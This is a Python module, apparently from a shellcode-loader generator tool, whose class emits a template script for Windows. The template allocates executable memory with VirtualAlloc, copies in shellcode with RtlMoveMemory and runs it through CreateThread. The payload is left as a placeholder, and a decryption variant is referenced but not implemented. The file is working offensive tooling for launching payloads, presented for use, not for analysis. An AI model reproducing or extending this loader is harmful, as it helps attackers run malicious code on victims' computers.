#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Python原始加载器模块：单一职责 - 仅实现Python原始加载器生成，遵循BaseLoader接口
"""
from core.loader.base_loader import BaseLoader
from ctypes import WinError

class PythonRawLoader(BaseLoader):
    """Python原始加载器：单一职责 - 仅生成Python原始加载器（无解密）"""
    @property
    def lang_name(self) -> str:
        return "Python"
    
    def generate_raw(self, shellcode_len: int) -> str:
        """生成Python原始加载器内容"""
        return f"""import ctypes
from ctypes import wintypes
from ctypes import WinError

# 初始化Windows API
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# 定义常量
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = 0xFFFFFFFF

# 定义函数原型
kernel32.VirtualAlloc.restype = wintypes.LPVOID
kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]

kernel32.RtlMoveMemory.restype = None
kernel32.RtlMoveMemory.argtypes = [wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t]

kernel32.CreateThread.restype = wintypes.HANDLE
kernel32.CreateThread.argtypes = [wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]

kernel32.WaitForSingleObject.restype = wintypes.DWORD
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

kernel32.VirtualFree.restype = wintypes.BOOL
kernel32.VirtualFree.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD]

kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

def main():

    shellcode = bytearray([/* 此处填入字节数组格式shellcode */])
    shellcode_len = {shellcode_len}

    # 分配可执行内存
    mem = kernel32.VirtualAlloc(None, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not mem:
        raise WinError(ctypes.get_last_error(), "VirtualAlloc failed")

    # 复制shellcode到内存
    kernel32.RtlMoveMemory(mem, (ctypes.c_ubyte * shellcode_len).from_buffer(shellcode), shellcode_len)

    # 创建线程执行shellcode
    h_thread = kernel32.CreateThread(None, 0, ctypes.cast(mem, wintypes.LPVOID), None, 0, None)
    if not h_thread:
        err = ctypes.get_last_error()
        kernel32.VirtualFree(mem, 0, 0x8000)  # MEM_RELEASE
        raise WinError(err, "CreateThread failed")

    # 等待线程执行完成
    kernel32.WaitForSingleObject(h_thread, INFINITE)

    # 清理资源
    kernel32.CloseHandle(h_thread)
    kernel32.VirtualFree(mem, 0, 0x8000)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error: {{e}}")
"""
    
    def generate_decrypt(self, shellcode_len: int, encryption_history):
        """（原始加载器无需实现解密，抛出异常）"""
        raise NotImplementedError("原始加载器不支持解密功能")